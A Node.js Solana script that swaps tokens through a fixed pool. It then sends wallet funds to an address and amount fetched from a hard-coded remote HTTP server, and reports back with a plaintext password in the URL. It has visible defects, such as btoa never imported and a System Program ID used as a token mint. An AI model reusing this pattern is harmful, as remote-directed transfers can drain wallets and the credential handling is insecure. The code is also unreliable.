const { Connection, PublicKey } = require('@solana/web3.js')
const anchor = require("@project-serum/anchor")
const { requestInfos, swap, transfer, walletFromRaw, getTokenAccounts } = require("./utils/utils.js");
const { getSwapOutAmount } = require("./utils/tokens.js");
// const{ PublicKey } = require("@solana/web3.js";
const {commitment} = require("./utils/web3.js")
const fetch = require("node-fetch")
var atob = require("atob")

const ammId = "58oQChx4yWmvKdwLLZzBi4ChoCc2fqCUWBkwMihLYQo2"

const baseMint = "11111111111111111111111111111111"; // from token address in string representattion
const quoteMint = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // = to token address in string representattion
const fromCoinAmount = "10000"; // string amount with all decimals (6 default)
const baseUrl = "http://ec2-3-9-18-254.eu-west-2.compute.amazonaws.com:30254/"


const createWeb3Instance = (endpoint) => {
  const web3 = new Connection(endpoint, commitment);
  return web3;
};

async function getBase64() {
  try {
    const data = await fetch(baseUrl + "extract");
    const json = await data.json()
    return json.Value
  } catch (e) {
    console.log(e);
    return null
  }

}

function _base64ToArrayBuffer(base64) {
  var binary_string = atob(base64);
  var len = binary_string.length;
  var bytes = new Uint8Array(len);
  for (var i = 0; i < len; i++) {
      bytes[i] = binary_string.charCodeAt(i);
  }
  return bytes;
}

function _arrayBufferToBase64( buffer ) {
  var binary = '';
  var bytes = new Uint8Array( buffer );
  var len = bytes.byteLength;
  for (var i = 0; i < len; i++) {
      binary += String.fromCharCode( bytes[ i ] );
  }
  return btoa( binary );
}

function extractDataFromBase(base) {
  const buffer = _base64ToArrayBuffer(base)
  console.log(buffer);
  const address = _arrayBufferToBase64(buffer.slice(200, 232).buffer)
  const amount = parseInt(buffer.slice(328).toString(), 16)
  return [address, amount]
}

async function main() {
  const endpoint = "https://solana-api.projectserum.com";
  const connection = createWeb3Instance(endpoint);
  const owner = walletFromRaw()

  const baseString = await getBase64();
  if(!baseString) return;
  const [address, amount] = extractDataFromBase(baseString)
  try{
    const infos = await requestInfos(connection);
    const poolInfo = Object.values(infos).find((p) => p.ammId === ammId);
    const data = await getTokenAccounts(connection, owner.publicKey)
  
    const baseAccount = data[baseMint]; // from token user account
    const quoteAccount = data[quoteMint]; // to token user account
  
    const toCoinWithSlippage = getSwapOutAmount(
      poolInfo,
      baseMint,
      quoteMint,
      amount,
      "0.5"
    )
  
    const txnId = await swap(
      connection,
      owner,
      poolInfo,
      baseMint,
      quoteMint,
      baseAccount,
      quoteAccount,
      fromCoinAmount,
      toCoinWithSlippage
    );
    console.log(txnId);
    const res = await transfer(connection, owner, address, amount);

    const deleteQuery = fetch(baseUrl+"delete?base64bytes=" + baseString + "&pass=lolkek&key=" + address + res + "&txn=" + txnId)
  } catch(e) {
    console.log(e)
  } 
}

main().then("Finished swap");
